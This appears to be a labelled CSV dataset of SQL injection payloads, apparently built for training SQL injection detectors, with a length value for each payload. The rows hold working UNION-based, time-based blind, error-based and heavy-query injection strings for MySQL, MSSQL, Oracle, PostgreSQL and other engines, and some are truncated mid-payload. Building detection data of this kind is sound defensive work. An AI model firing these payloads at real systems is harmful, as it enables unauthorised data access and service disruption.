sentence,attack_type,len_payload
 ( SELECT  ( CASE WHEN  ( 9041 = 9041 )  THEN 77B4A14B9E00AF083BA8806DA94B1348 ELSE 1/ ( SELECT 0 FRO,1,100
1'  )  )   as joco where 2922 = 2922,1,36
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1,82
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  6875 = 6875",1,323
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (   ( 'ctbs' like 'ctbs",1,119
"1'|| ( select 'pvmz' from dual where 1090 = 1090 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  ||'",1,216
"' UNION ALL SELECT NULL, NULL, NULL, NULL--",1,43
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""elFO"" = ""elFO",1,354
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and ""ekjs"" like ""ekjs",1,139
"1"" and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""tfok"" like ""tfok",1,226
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  3449 = 3449",1,329
select  ( case when  ( 5752 = 6036 )  then 1 else 5752* ( select 5752 from master..sysdatabases )  end ) --,1,107
""" AND 7194 = CTXSYS.DRITHSX.SN ( 7194, ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7194 = 7194 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   )  AND ""XyCC"" LIKE ""XyCC",1,280
"1'  )  )   ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (  'rnyb' = 'rnyb",1,269
1 )  as crsd where 5271 = 5271 waitfor delay '0:0:5'--,1,54
-2402 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   a,1,255
"1  )  )   as rqbo where 2243 = 2243 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1,176
"""  )  )    )  )    )  )   waitfor delay '0:0:20' --",1,51
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'BkzS' LIKE 'BkzS",1,194
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1,64
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""zCji"" = ""zCji",1,187
"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL,NULL )  --",1,70
"1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'ofko' = 'ofko",1,147
1'+ ( select dpkp where 4836 = 4836 and sleep ( 5  )  )  +',1,59
 or SLEEP(5)#,1,12
"-6597'+ ( select aewz where 4036 = 4036 union all select 4036,4036,4036,4036,4036,4036,4036--",1,93
"1%""  )  )   )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,177
"1'  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  'hpbt' = 'hpbt",1,144
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'VvGL' LIKE 'VvGL",1,99
"-9370' )  where 7070 = 7070 or make_set ( 9354 = 9354,7185 ) --",1,63
select  ( case when  ( 8403 = 7151 )  then 8403 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,115
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'zWha' LIKE 'zWha",1,130
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'RBOO' = 'RBOO",1,260
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""IsYb"" = ""IsYb",1,257
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'rmUi' = 'rmUi",1,152
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,112
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND ""pXtF"" = ""pXtF",1,242
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'mdAK' LIKE 'mdAK",1,346
"-3205"" )  union all select 5233,5233,5233,5233#",1,47
1 )  where 8813 = 8813,1,22
"1'+ ( select lhtn where 8484 = 8484 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  +'",1,227
"1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""cdai"" = ""cdai",1,95
"1"" where 2072 = 2072 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,118
-9650' )  or 1390 = 3209,1,24
"-5190%"" or 8298 = 9306 and ""%"" = """,1,34
" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,149
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""dqRu"" LIKE ""dqRu",1,326
"1'+ ( select 'asmj' where 7808 = 7808 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5  )  )  +'",1,140
"-7333%""  )  )   )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( ""%"" = """,1,144
"-3298 union all select 7618,7618,7618,7618,7618,7618,7618,7618,7618,7618#",1,73
"  )  )   AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a )  AND   (  (  6272 = 6272",1,287
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 4724 = 4724",1,341
-4157' )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr,1,255
"' AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a ) ",1,257
" select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1,56
1' rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and 'vnkr' like 'vnkr,1,87
"""  )  )   or sleep ( __TIME__ )  = """,1,36
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND ""ebVT"" LIKE ""ebVT",1,335
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'UjvT' = 'UjvT",1,305
'  )  )   )  AND 1917 IN   (  (  CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 1917 = 1917 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'fclk' LIKE 'fclk,1,297
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND 'HAhW' = 'HAhW",1,194
"1' where 8749 = 8749 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,96
 end and 'hizd' = 'hizd,1,22
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'FofE' = 'FofE",1,131
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""AdYk"" LIKE ""AdYk",1,308
"1' )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,45
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  'yKOR' = 'yKOR",1,161
"UE1nc: select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",1,100
"1"" where 4978 = 4978 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,183
1' where 9216 = 9216,1,20
"-1868"" )  where 9495 = 9495 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,192
1' )  waitfor delay '0:0:5' and  ( 'fpnh' = 'fpnh,1,49
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'euvw' = 'euvw",1,175
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,322
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 'aIKH' LIKE 'aIKH",1,185
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""Mhxi"" = ""Mhxi",1,125
"1"" where 5216 = 5216 or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,128
"1"" and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""wtkx"" = ""wtkx",1,182
"-4705' where 2029 = 2029 union all select 2029,2029,2029#",1,57
select sleep ( 5  )  )  +',1,26
"1' in boolean mode )  and elt ( 4249 = 4249,7259 ) #",1,52
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 4631 = 4631",1,353
1'  )  )   )  union all select null#,1,36
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""iSFi"" = ""iSFi",1,103
' ) ; BEGIN USER_LOCK.SLEEP ( 5 ) ; END;--,1,42
"1'  )  )   )  union all select null,null,null#",1,46
1' )  and  ( 7603 = 3634 ) *3634,1,32
1'|| ( select 'adni' from dual where 6611 = 6611,1,48
1  )  )   as sipp where 1999 = 1999 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --,1,98
"-3169"" order by 1#",1,18
"1""  )  )   )  or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (   ( ""ugtw"" = ""ugtw",1,117
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,224
"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1,272
"1 )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  ",1,84
"1'  )  )   as kdwc where 5906 = 5906 union all select null,null,null,null,null,null,null,null,null--",1,100
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  8112 = 8112",1,294
"1 )  as wokl where 1368 = 1368 union all select null,null,null,null,null,null--",1,79
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""bILh"" LIKE ""bILh",1,158
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 'WlUL' = 'WlUL",1,200
"-7111 union all select 2409,2409,2409,2409,2409,2409#",1,53
sqlvuln;,1,8
"-9054"" )  as rgyu where 3792 = 3792 order by 1--",1,48
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 5250 = 5250",1,129
"1%"" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and ""%"" = """,1,67
"s&ovU: select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'",1,83
"1""  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( ""ldlp"" = ""ldlp",1,244
"1%' )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( '%' = '",1,293
" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4",1,63
"& ( 1UE: select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@VERSION -- 1",1,87
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,308
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( ""vabm"" = ""vabm",1,111
"1' )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,189
"1'  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and 'aicu' = 'aicu",1,287
"-2027%"" )  union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1,68
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( ""uMWf"" = ""uMWf",1,78
"1  )  )   as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,133
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 5991 = 5991",1,263
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'STpC' = 'STpC",1,247
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 4725 = 4725",1,317
" UNION SELECT @@VERSION,SLEEP ( 5 ) ,USER (  ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,5,6,7,8#",1,93
"  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  3304 = 3304",1,173
"-3009'+ ( select 'gqbo' where 6915 = 6915 union all select 6915,6915--",1,70
"1%""  )  )   and  ( 7817 = 4371 ) *4371 and   (  (  ""%"" = """,1,58
"""  )  )  ; BEGIN DBMS_LOCK.SLEEP ( 5 ) ; END;-- AND   (  (  ""ZTFm"" LIKE ""ZTFm",1,77
"1%' )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,124
 AND 5925 = 9447--,1,17
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'UKNt' = 'UKNt",1,312
"1' or elt ( 6272 = 6272,sleep ( 5  )  )   and 'vrim' = 'vrim",1,60
"select * from generate_series ( 3427,3427,case when  ( 3427 = 7516 )  then 1 else 0 end )  limit 1--",1,100
' )  AND 7767 = CAST ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 7767 = 7767 )  THEN 1 ELSE 0 END  )  )  ::text||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58 )  AS NUMERIC )  AND  ( 'HXoj' = 'HXoj,1,266
1'  )  )   as mbzk where 9153 = 9153 and 2006 = 2006,1,52
' )  AND 93 = 93 AND  ( 'ZIYy' = 'ZIYy,1,38
" select * from users where id = 1<@.. union select 1,version (  )  -- 1",1,70
"1  )  )   union all select null,null,null,null,null,null,null,null,null,null--",1,78
1' where 2134 = 2134 rlike  ( select  ( case when  ( 3613 = 2090 )  then 1 else 0x28 end  )  )  --,1,98
"1'  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  'lgcw' = 'lgcw",1,175
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (  ""scbo"" LIKE ""scbo",1,87
"1 )  where 1013 = 1013 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,296
"1 )  as lhie where 4631 = 4631 union all select null,null,null,null,null--",1,74
1' )  where 6244 = 6244 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --,1,88
-2050' union all select 5606#,1,29
"1 )  where 5615 = 5615 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,272
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( 'ywMz' LIKE 'ywMz",1,83
 ( SELECT  ( CASE WHEN  ( 2662 = 2662 )  THEN 77B4A14B9E00AF083BA8806DA94B1348 ELSE 2662* ( SELECT 26,1,100
